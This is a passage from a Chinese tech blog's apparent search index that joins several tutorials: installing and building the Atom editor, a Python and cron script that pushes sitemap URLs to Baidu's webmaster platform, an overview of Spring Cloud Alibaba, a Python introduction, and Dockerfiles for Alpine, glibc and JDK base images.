官方开发组调整了兼容策略，Atom 1.58.0 + 不再支持运行在 CentOS7（或 RedHat 7），即 Atom 无法通过 YUM 在线安装或者 RPM 包离线安装。若希望在 CentOS7 上继续使用 Atom，请确保 Atom 的版本小于等于 1.57，详情请看这里。 相关站点 Atom Github Atom 官方安装教程（Linux 版） Atom 官方源码安装教程（Linux 版） Debian、Ubuntu 安装 Atom 方法一：通过 Atom 官方的软件包存储库来安装，优点是能够在官方发布新版本时，很方便地更新 Atom 1234567891011# 添加Key# wget -qO - https://packagecloud.io/AtomEditor/atom/gpgkey | apt-key add -# 添加软件包存储库# sh -c \'echo "deb [arch=amd64] https://packagecloud.io/AtomEditor/atom/any/ any main" &gt; /etc/apt/sources.list.d/atom.list\'# 更新软件源列表# apt-get update# 安装Atom# apt-get install atom 方法二：下载 Atom 的 DEB 软件包并直接安装 12345# 安装Atom# dpkg -i atom-amd64.deb# 若安装过程提示缺失依赖，可执行下述命令解决# apt-get -f install CentOS 安装 Atom 方法一：通过 Atom 官方的软件包存储库来安装，优点是能够在官方发布新版本时，很方便地更新 Atom 12345678# 添加Key# rpm --import https://packagecloud.io/AtomEditor/atom/gpgkey# 添加软件包存储库# sh -c \'echo -e "[Atom]\\nname=Atom Editor\\nbaseurl=https://packagecloud.io/AtomEditor/atom/el/7/\\$basearch\\nenabled=1\\ngpgcheck=0\\nrepo_gpgcheck=1\\ngpgkey=https://packagecloud.io/AtomEditor/atom/gpgkey" &gt; /etc/yum.repos.d/atom.repo\'# 安装Atom# yum install atom 方法二：下载 Atom 的 RPM 软件包并直接安装 12# 安装Atom# yum install -y atom.x86_64.rpm 源码安装 Atom 若项目日常开发中遇到 Atom 的 Bug，或者是想尝试向 Atom 的系统核心添加功能，则需要在 Dev 模式下运行 Atom，并访问本地的 Atom 源码。 克隆 Atom 的源码，并以开发者模式启动： 12345678910111213141516171819# 克隆Atom的源码# 建议下载Github Releases页面上发布的源码压缩包，而不是直接克隆Atom的master分支代码$ git clone git@github.com:your-username/atom.git# 进入Atom的源码目录$ cd atom# 安装Atom的依赖，如果安装过程出现“keyboard-layout”包构建失败的错误，此时需要额外安装"libxkbfile-devel"软件包$ ./script/bootstrap# 使用开发模式启动Atom$ atom --dev# 或者指定Atom的源码路径，也可以通过设置环境变量"ATOM_DEV_RESOURCE_PATH"来指定源码所在的路径$ atom --dev atom-source-path# 提示：# 建议通过设置环境变量"ATOM_DEV_RESOURCE_PATH"，指定Atom源码所在的路径# 如果 atom 命令在终端中没有响应，请尝试 atom-dev 或 atom-beta，后缀取决于所克隆的特定源代码的版本 本地测试运行 Atom： 12345# 进入Atom的源码目录$ cd atom# 测试$ atom --test spec 构建生成 Atom 的安装包 Ubuntu、Debian 构建生成 DEB 安装包： 123456789101112131415# 安装依赖# apt-get install build-essential git libsecret-1-dev fakeroot rpm libx11-dev libxkbfile-dev# 如果下面执行 script/build 脚本出现错误，则可能需要使用C++11安装更新的C++编译器# add-apt-repository ppa:ubuntu-toolchain-r/test# apt-get update# apt-get install gcc-5 g++-5# update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 80 --slave /usr/bin/g++ g++ /usr/bin/g++-5# update-alternatives --config gcc # or choose gcc-5 from the list# 进入Atom的源码目录$ cd atom# 构建安装包$ ./script/build --create-debian-package CentOS 构建生成 RPM 安装包： 12345678# 安装依赖# yum install -y make gcc gcc-c++ glibc-devel git-core libsecret-devel rpmdevtools libxkbfile-devel# 进入Atom的源码目录$ cd atom# 构建安装包$ ./script/build --create-rpm-package Atom 设置代理 123456789101112# 方法一# 设置代理$ apm config set strict-ssl false$ apm config set proxy YOUR_PROXY_ADDRESS$ apm config set http-proxy YOUR_PROXY_ADDRESS$ apm config set https-proxy YOUR_PROXY_ADDRESS# 验证代理配置是否正确$ apm config get proxy$ apm config get http-proxy$ apm config get https-proxy 12345678910111213# 方法二# 编辑Atom的配置文件，添加代理配置$ vim ~/.atom/.apmrcstrict-ssl=falseproxy=http://127.0.0.1:8118http-proxy=http://127.0.0.1:8118https-proxy=http://127.0.0.1:8118# 验证代理配置是否正确$ apm config get proxy$ apm config get http-proxy$ apm config get https-proxy Atom 的配置文件 Atom 默认的配置文件存放在 ~/.atom 目录下，其中的 ~/.atom/packages 用于存放 Atom 的插件，~/.atom 目录可以移植到不同的平台（Linux、Window、Mac）。在开发者模式下，Atom 默认加载的插件目录为：~/.atom/dev/packages。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 开发工具"},{title:"百度站长链接提交 - 主动推送（Python 版）",url:"/posts/920b584b.html",text:'前言在加速百度搜索引擎收录站点方面，百度站长目前提供自动提交链接和手动提交链接两种方式，其中自动提交又分为主动推送、自动推送和 sitemap 三种形式。按百度的说法，主动推送的效果最好，百度站长平台后台提供了 Curl、PHP、Ruby 的推送示例代码，但唯独没有提供 Python 示例代码。本文会给出现成的 Python 版本主动推送代码，系统环境依赖 Linux，软件环境依赖 Python3、Curl。 Python3 代码以下代码会读取特定域名下的 sitemap 站点地图文件，然后通过 Curl 命令将站点地图文件中合法 （结尾为 .html）的 URL 批量提交给百度站长平台，请自行替换代码中的 domain、token、site_map_url 变量值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# -*- coding: utf-8 -*-import reimport loggingimport subprocessfrom io import StringIOfrom urllib import request# 站点域名domain = \'www.example.com\'# 在百度站长申请的推送用的准入密钥token = \'xxxxxxxxxxxxxxxxx\'# 站点地图的URLsite_map_url = \'https://www.example.com/sitemap.xml\'# 最大的链接推送数量push_max_lines = 1000# 推送的URL链接文件push_urls_file = "/tmp/baidu_zhanzhang_push_url.txt"# 数据推送的接口push_url = \'http://data.zz.baidu.com/urls?site={domain}&amp;token={token}\'.format(domain=domain, token=token)# 日志文件log_file = "/tmp/baidu/baidu_zhanzhang_push.log"def regexpMatchUrl(content): pattern = re.findall(r\'(http|https):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+([\\w\\-\\.,@?^=%&amp;amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;amp;/~\\+#])?\', content, re.IGNORECASE) if pattern: return True else: return Falsedef regexpMatchWebSite(content): pattern = re.findall(r\'\'.join(domain), content, re.IGNORECASE) if pattern: return True else: return Falsedef getUrl(content): pattern = re.findall(r\'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+.html\', content, re.IGNORECASE) if pattern: return pattern[0] else: return \'\'def createUrlFile(url_file_path, max_lines): content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) url_file = open(url_file_path, \'w\') index = 0 for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): url = getUrl(line) if(url != \'\'): index = index + 1 url_file.writelines(url + "\\n") if(index &gt;= max_lines): break url_file.close() website_map_file.close()def pushUrlFile(url, url_file_path, log_file): shell_cmd_line = "curl -H \'Content-Type:text/plain\' --data-binary @" + url_file_path + " " + \'\\"\' + url + \'\\"\' (status, output) = subprocess.getstatusoutput(shell_cmd_line) logging.info(output + "\\n") # print(shell_cmd_line)if __name__ == "__main__": logging.basicConfig(level=logging.INFO, format=\'%(asctime)s - %(name)s - %(levelname)s - %(message)s\', filename=log_file) createUrlFile(push_urls_file, push_max_lines) pushUrlFile(push_url, push_urls_file, log_file) Crontab 定时任务Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时主动提交链接到百度站长平台。 12# 每隔两小时主动提交一次链接0 */2 * * * /usr/bin/python3 /usr/local/baidu-push/baidu_zhanzhang_push.py 脚本输出的日志信息123456789$ cat /tmp/baidu/baidu_zhanzhang_push.log2019-02-18 23:15:20,985 - www - INFO - % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0100 6092 100 30 100 6062 82 16671 --:--:-- --:--:-- --:--:-- 16653{"remain":98069,"success":138} Docker 一键部署推送服务 Dockerfile 的内容如下，构建生成 Docker 镜像后，使用命令直接启动 Docker 镜像即可。 使用命令直接启动 Docker 镜像时，需要通过 -v 参数将宿主机的 Python 脚本文件挂载到 Docker 容器内的 /usr/local/python_scripts/baidu_zhanzhang_push.py 位置。 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 */2 * * * root /usr/bin/python3 /usr/local/python_scripts/baidu_zhanzhang_push.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 若通过 Docker-Compose 来管理 Docker 镜像，那么 YML 配置文件的内容如下： 123456789101112version: \'3.5\'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: \'Asia/Shanghai\' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/baidu_zhanzhang_push.py:/usr/local/python_scripts/baidu_zhanzhang_push.py 数据卷挂载： /usr/local/baidu-push/logs：宿主机里的日志目录 /usr/local/baidu-push/baidu_zhanzhang_push.py：宿主机里 Python 脚本文件的路径 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"python"},{title:"Spring Cloud Alibaba 新一代微服务解决方案",url:"/posts/97d0a561.html",text:'Spring Cloud Alibaba 是什么Spring Cloud Alibaba 是阿里巴巴提供的微服务开发一站式解决方案，是阿里巴巴开源中间件与 Spring Cloud 体系的融合，Github 项目地址在这里，官方文档在这里。 Spring Cloud 概述提起微服务，不得不提 Spring Cloud 全家桶系列，Spring Cloud 是若干个框架的集合，包括 spring-cloud-config、spring-cloud-bus 等近 20 多个子项目，提供了服务治理、服务网关、智能路由、负载均衡、断路器、监控跟踪、分布式消息队列、配置管理等领域的解决方案。Spring Cloud 通过 Spring Boot 风格的封装，屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、容易部署的分布式系统开发工具包。一般来说，Spring Cloud 包含以下组件，主要以 Netflix 开源项目为主： Spring Cloud Alibaba 概述同 Spring Cloud 一样，Spring Cloud Alibaba 也是一套微服务解决方案，包含开发分布式应用微服务的必需组件，方便开发者通过 Spring Cloud 编程模型轻松使用这些组件来开发分布式应用服务。依托 Spring Cloud Alibaba，开发者只需要添加一些注解和少量配置，就可以将 Spring Cloud 应用接入阿里微服务解决方案，通过阿里中间件来迅速搭建分布式应用系统。作为 Spring Cloud 体系下的新实现，Spring Cloud Alibaba 跟官方的组件或其它的第三方实现如 Netflix、Consul、Zookeeper 等对比，具备了更多的功能: Spring Cloud Alibaba 包含的组件下图是 Spring Cloud Alibaba 系列组件，其中包含了阿里开源组件、阿里云商业化组件，以及集成了 Spring Cloud 组件。 Alibaba 开源组件 Nacos：一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 Sentinel：把流量作为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。 RocketMQ：开源的分布式消息系统，基于高可用分布式集群技术，提供低延时的、高可靠的消息发布与订阅服务。 Dubbo：在国内应用非常广泛的一款高性能 Java RPC 框架。 Seata：阿里巴巴开源产品，一个易于使用的高性能微服务分布式事务解决方案。 Arthas：开源的 Java 动态追踪工具，基于字节码增强技术，功能非常强大。 Alibaba 商业化组件 Alibaba Cloud ACM：一款在分布式架构环境中对应用配置进行集中管理和推送的应用配置中心产品。 Alibaba Cloud OSS：阿里云对象存储服务（Object Storage Service，简称 OSS），是阿里云提供的云存储服务。 Alibaba Cloud SchedulerX：阿里中间件团队开发的一款分布式任务调度产品，提供秒级、精准的定时（基于 Cron 表达式）任务调度服务。 Alibaba 集成 Spring Cloud 组件Spring Cloud Alibaba 作为整套的微服务解决组件，只依靠目前阿里的开源组件是不够的，更多的是集成当前的社区组件，所以 Spring Cloud Alibaba 可以集成 Zuul，OpenFeign 等组件，也支持 Spring Cloud Stream 消息组件。Spring Cloud Alibaba 适配了 Spring Cloud 中 Edgware、Finchley、Greenwich 三个版本的对应版本，具体对应关系如下： Spring Cloud Alibaba 的功能服务注册与发现Spring Cloud Alibaba 基于 Nacos 提供 spring-cloud-alibaba-starter-nacos-discovery 、spring-cloud-alibaba-starter-nacos-config 实现了服务注册与配置管理功能。依靠 @EnableDiscoveryClient 进行服务注册，兼容 RestTemplate 与 OpenFeign 的客户端进行服务调用，同时适配了 Spring Cloud 的服务注册与发现标准，默认集成了 Ribbon 的支持。 支持多协议的服务调用Spring Cloud 默认的服务调用依赖 RestTemplate 或者 OpenFeign 使用 REST 进行调用。使用 @DubboTransported 注解可将底层的 REST 协议无缝切换成 Dubbo RPC 协议，进行 RPC 调用。 123456789@FeignClient("dubbo-provider")@DubboTransported(protocol = "dubbo")public interface DubboFeignRestService { @GetMapping(value = "/param") String param(@RequestParam("param") String param); @PostMapping("/saveB") String saveB(@RequestParam("a") int a, @RequestParam("b") String b);} 服务限流降级作为稳定性的核心要素之一，服务限流和降级是微服务领域特别重要的一环，Spring Cloud Alibaba 基于 Sentinel，对 Spring 体系内基本所有的客户端和网关进行了适配，默认支持 WebServlet、WebFlux、OpenFeign、RestTemplate、Spring Cloud Gateway、Zuul、Dubbo 和 RocketMQ 限流降级功能的接入。Sentinel 的应用比较简单，只需引入 starter 即可生效，可以在运行时通过控制台实时修改限流降级规则，还支持查看限流降级 Metrics 监控。 微服务消息驱动支持为微服务应用构建消息驱动能力，基于 Spring Cloud Stream 提供 Binder 的新实现：Spring Cloud Stream RocketMQ Binder，也新增了 Spring Cloud Bus 消息总线的新实现： Spring Cloud Bus RocketMQ。 分布式事务使用 Seata 解决微服务场景下面临的分布式事务问题，通过 @GlobalTransactional 注解，在微服务中传递事务上下文，可以对业务零侵入地解决分布式事务问题。 阿里云提供的商业能力通过上面提到的 OSS，SchedulerX 等组件，开发者可以在阿里云上实现对象存储，分布式任务调度等功能。 Spring Cloud Alibaba 的优势阿里巴巴强大的技术输出能力阿里巴巴无疑是国内开源技术领域的最有影响力的公司之一，已经有 Dubbo、Druid，FastJson 等成功的开源组件，再加上阿里不遗余力的推广，社区发展也非常快。 云原生趋势，集成阿里云商业化组件云原生（Cloud Native）是今年技术领域特别热门的一个词，云原生是一种专门针对云上应用而设计的方法，用于构建和部署应用，以充分发挥云计算的优势。Spring Cloud Alibaba 集成了阿里云的商业化组件，可以说天然支持云原生特性。 集成 Dubbo，利用 Dubbo 在微服务领域的超高人气Dubbo 是国内应用最广的分布式服务框架之一，基于 Dubbo 改造的 DubboX 等也有很多公司在使用，Spring Cloud Alibaba 对 Dubbo 做了比较好的集成，可以吸引不少使用 Dubbo 的开发者。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Python 入门教程 - Python 介绍",url:"/posts/6bd46e8d.html",text:'Python 介绍Python 是一种解释型、面向对象的语言，编译后生成字节码文件 (.py 后缀)，运行在 PVM 虚拟机。Python 的创始人为吉多・范罗苏姆（Guido van Rossum），而 Python 是由 C 语言开发，但是不再有 C 语言中指针等复杂数据类型。 Python 的特点 语法简洁 可读性强 面向对象 免费和开源 丰富的库 (丰富的标准库，多种多样的扩展库) 可扩展性，方便嵌入到 C 和 C++ 语言，俗称胶水式语言 可移植性和跨平台，Python 会被编译成与操作系统相关的二进制代码，然后再解释执行。这种方式和 Java 类似，大大提高了执行速度，也实现了跨平台 Python 的应用范围 科学计算 人工智能 WEB 服务端和大型网站后端（如 YouTube、Gmail、豆瓣） 大数据 云计算 系统运维 GUI 开发 游戏开发 移动设备 嵌入式设备 Python 的解释器、编译器解析器的种类CPython（Clang）、JPython（Java）、IronPython（.Net）、PyPy（Python）。 解释器、编译器介绍计算机不能直接理解任何除机器语言以外的语言，所以必须要把程序员所写的程序语言翻译成机器语言，计算机才能执行程序。将其他语言翻译成机器语言的工具，被称为编译器，编译器翻译的方式有两种：一个是编译，另外一个是解释。两种方式之间的区别在于翻译时间点的不同。当编译器以解释方式运行的时候，也称之为解释器。 编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成为机器语言的文件，运行时不需要重新翻译，直接使用编译的结果就行了。程序执行效率高，依赖编译器，跨平台性差些。如 C、C++ 解释型语言：解释型语言编写的程序不进行预先编译，以文本方式存储程序代码，会将代码一句一句直接运行。在发布程序时，看起来省了道编译工序，但是在运行程序的时候，必须先解释再运行。 编译型语言和解释型语言对比：速度 — 编译型语言比解释型语言执行速度快；跨平台性 — 解释型语言比编译型语言跨平台性好。 Python 的缺点Python 是解释执行的语言，性能较低。因此，一些影响性能的功能可以使用 C/C++/JAVA/GO（GO 是 Google 的一门语言，写起来像 Python，性能像 C 语言）去开发，不过不用担心，Python 解释器会越来越快。 Python 的版本说明Python 的版本兼容 目前主要的两个版本 Python2.x: 2000 年 10 月发布，最新版本是 2.7，已经停止更新，2.7 被确定为最后一个 Python 2.x 版本，预计 2020 年退出历史舞台，解释器名称是 python Python3.x: 2008 年发布，Python3 有了较大的提升，不兼容 Python2，解释器名称是 python3 解决版本兼容问题 官方提供了一个过渡版本 Python 2.6，基本使用了 Python 2.x 的语法和库，同时考虑了向 Python 3.0 的迁移，允许使用部分 Python 3.0 的语法与函数 Python3 的很多新特性也被移植到了 Python2.7，如果程序可以在 2.7 运行，可以通过一个名为 2to3（Python 自带的一个脚本）的转换工具无缝迁移到 Python3 如果开发时，无法立即使用 Python 3.0（还有极少的第三方库不支持 3.0 的语法），建议先使用 Python 3.0 版本进行开发，然后使用 Python 2.6、Python 2.7 来运行，并且做一些兼容性的处理 Python 的多版本共存 第一种方法：使用 pyenv 进行版本管理 第二种方法：编译安装不同版本的 Python Python 集成开发环境IDLE 介绍 IDLE 是 Python 的官方标准开发环境，Windows 环境下 Python 安装完后默认就安装了 IDLE IDLE 是用纯 Python 基于 Tkinter 编写，最初的作者正是 Python 之父 Guido Van Rossum IDLE 已经具备了 Python 开发几乎所有功能 (语法智能提示、不同颜色显示不同类型等等)，也不需要其他配置，非常适合初学者使用 IDLE 是 Python 标准发行版内置的一个简单小巧的 IDE，包括了交互式命令行、编辑器、调试器等基本组件，足以应付大多数简单应用 常用集成开发环境 IDLE Pycharm wingIDE Eclipse IPython var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"python"},{title:"SpringCloud 容器化",url:"/posts/fe094f6c.html",text:'前言容器化技术的出现标准化了服务的基础设施，统一了应用的打包分发、部署及操作系统相关类库等，解决了测试及生产部署时环境差异的问题，更方便分析排查问题。对运维来说，由于镜像的不可变性，更容易进行服务部署升级及回滚。另外利用诸如 Kubemetes 之类的容器管理平台，更容易实现一键部署、扩容、缩容等操作，更能将微服务架构、DevOps、不可变基础设施的思想落地下来。本文重点讲述 Spring Cloud 如何使用 Docker 实现容器化。 Java 服务 Docker 化基础镜像选择操作系统层面，可以选择传统的 Centos、Ubuntu 或者轻量级的 Alpine。其中 Ubuntu 16.04 版本的镜像大小约为 113M，压缩后大约 43M；Centos 7 版本的镜像大小约为 199M，压缩后大约为 73M；而 Alpine 3.7 版本镜像大小约为 4.15M，压缩后约为 2M。关于基础镜像的选择，一个是考虑镜像大小，一个是只提供最小的依赖包。关于第二点，不同的服务应用依赖包是不同的，这里不再展开，只从镜像大小角度考虑的话，Alpine 是首选，镜像小，远程推拉镜像的速度快，更为方便，这里建议釆用 Alpine 镜像作为基础镜像。从 Docker 镜像分层缓存的机制来考虑，如果选择了比较大的基础镜像，DockerFile 编写时可以适当分层，然后集中在几台镜像打包机上处理镜像打包及上传，这样可以充分利用打包机镜像分层缓存的机制，减少上传镜像的耗时。但是对于分布式服务的 Docker 部署，目标服务实例部署的机器比较多而且是随机的，就没办法利用这个机制来加快镜像下载速度。 DockerFile 编写选择 Alpine 有个麻烦的地方就是 Alpine 采用的是 musl libc 的 C 标准库，而 Oracle JDK 或 OpenJDK 提供的版本则主要是以 glibc 为主，虽然 OpenJDK 在一些早期版本会放出使用 musl libc 编译好的版本，不过在正式发布的时候，并没有单独的 musl libc 编译版本可以下载，需要自己单独编译，稍微有些不便。因此可以考虑在 Alpine 里加上 glibc，然后添加 glibc 的 JDK 编译版本作为基础镜像。 Alpine + glibc下述的 DockerFile 中，选择 Alpine 3.7 版本，glibc 釆用 Sgerrand 开源的 glibc 安装包，版本为 2.27-r0，该镜像可以作为后面的 JDK 镜像 的基础镜像。 1234567891011121314151617181920FROM alpine:3.7MAINTAINER example &lt;example@gmail.com&gt;RUN apk add --no-cache ca-certificates curl openssl binutils xz tzdata \\ &amp;&amp; ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ &amp;&amp; echo "Asia/Shanghai" &gt; /etc/timezone \\ &amp;&amp; GLIBC_VER="2.27-r0" \\ &amp;&amp; ALPINE_GLIBC_REPO="https://github.com/sgerrand/alpine-pkg-glibc/releases/download" \\ &amp;&amp; curl -Ls ${ALPINE_GLIBC_REPO}/${GLIBC_VER}/glibc-${GLIBC_VER}.apk &gt; /tmp/${GLIBC_VER}.apk \\ &amp;&amp; apk add --allow-untrusted /tmp/${GLIBC_VER}.apk \\ &amp;&amp; curl -Ls https://www.archlinux.org/packages/core/x86_64/gcc-libs/download &gt; /tmp/gcc-libs.tar.xz \\ &amp;&amp; mkdir /tmp/gcc \\ &amp;&amp; tar -xf /tmp/gcc-libs.tar.xz -C /tmp/gcc \\ &amp;&amp; mv /tmp/gcc/usr/lib/libgcc* /tmp/gcc/usr/lib/libstdc++* /usr/glibc-compat/lib \\ &amp;&amp; strip /usr/glibc-compat/lib/libgcc_s.so.* /usr/glibc-compat/lib/libstdc++.so* \\ &amp;&amp; curl -Ls https://www.archlinux.org/packages/core/x86_64/zlib/download &gt; /tmp/libz.tar.xz \\ &amp;&amp; mkdir /tmp/libz \\ &amp;&amp; tar -xf /tmp/libz.tar.xz -C /tmp/libz \\ &amp;&amp; mv /tmp/libz/usr/lib/libz.so* /usr/glibc-compat/lib \\ &amp;&amp; apk del binutils \\ &amp;&amp; rm -rf /tmp/${GLIBC_VER}.apk /tmp/gcc /tmp/gcc-libs.tar.xz /tmp/libz /tmp/libz.tar.xz /var/cache/apk/* 这里有几点需要注意： 由于 Docker 镜像采用的是分层机制，因此安全类库或软件的命令最好在同一行命令中，减少分层，以降低最后镜像的大小 命令中间安装了类库或软件包，需要在同一行命令中删除 apk 的 cache，这样才能有效删除 apk，以减少镜像大小 这里安装了 openssl、curl、xz、tzdata 库，同时把 timezone 改为了 Asia/Shanghai 构建镜像的命令为：docker build -f /usr/local/DockerFile-Alpine-Glibc -t alpine-3.7:glibc-2.27-r0 .，其中 /usr/local/DockerFile-Alpine-Glibc 是 DockerFile 的文件路径 由于构建镜像的过程比较慢，这里给出阿里云上已构建好的镜像（alpine + glibc），可以直接拉取到本地来使用，命令如下： 12# 拉取镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0 Alpine + glibc + JDK8对于 JDK 版本的选择，有 Oracle 的 Hotspot JDK，也有 OpenJDK。对于 Oracle 的 JDK，个人使用及非商业使用是免费的，而对于商业使用来说，需进行企业订阅，在 2019 年 1 月之后才能继续获得 Java SE8 更新。Oracle 已经建议选择不订阅或不继续订阅的公司在订阅结束之前，把 JDK 版本迁移到 OpenJDK，以确保相关应用程序不受影响。下述的 JDK 8 版本釆用 Oracle 的 server-jre-8ul72 版本，而对于 JDK 9、10 及 11 版本，则釆取 OpenJDK 来构建。附上 OpenJDK 的官方下载地址。 123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD server-jre-8u172-linux-x64.tar.gz /opt/RUN chmod +x /opt/jdk1.8.0_172ENV JAVA_HOME=/opt/jdk1.8.0_172ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK9123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-9u181_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-9ENV JAVA_HOME=/opt/jdk-9ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK10123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-10.0.1_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-10.0.1ENV JAVA_HOME=/opt/jdk-10.0.1ENV PATH="$JAVA_HOME/bin:${PATH}" Alpine + glibc + JDK11123456FROM registry.cn-hangzhou.aliyuncs.com/springcloud-cn/alpine-3.7:glibc-2.27-r0MAINTAINER example &lt;example@gmail.com&gt;ADD openjdk-11+28_linux-x64_bin.tar.gz /opt/RUN chmod +x /opt/jdk-11ENV JAVA_HOME=/opt/jdk-11ENV PATH="$JAVA_HOME/bin:${PATH}" 阿里云上有已构建好的不同版本的 JDK 镜像，拉取到本地就可以直接使用： 1234567891011# 基于 Oracle JDK 8 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:8u172-jre-alpine# 基于 OpenJDK 9 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-9u181-alpine# 基于 OpenJDK 10 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-10.0.1-alpine# 基于 OpenJDK 11 构建的镜像# docker pull registry.cn-hangzhou.aliyuncs.com/springcloud-cn/java:openjdk-11-ea19-alpine Maven 构建与发布镜像构建镜像的 Maven 插件主流的几款 Docker 的 Maven 插件： 这里以 Maven 构建为例，选用的是 com.spotify 的插件，其 Maven 的 POM 配置如下。使用 spring-boot-maven-plugin 的 1.4.3 版本，另外设置的镜像前缀为 registry.cn-hangzhou.aliyuncs.com/springcloud-cn，tag 为 $(project.version)， repository（私有仓库地址）为 ${docker.image.prefix}/${project.artifactId}，另外这里还传递了一个 Docker 的 buildArg 为 JAR_FILE，其值为 $(project.build.finalName) .jar。username 与 password 标签是指访问私有仓库的用户名和密码，若不需要身份认证，则可以注释这两个标签。点击下载完整的示例代码。 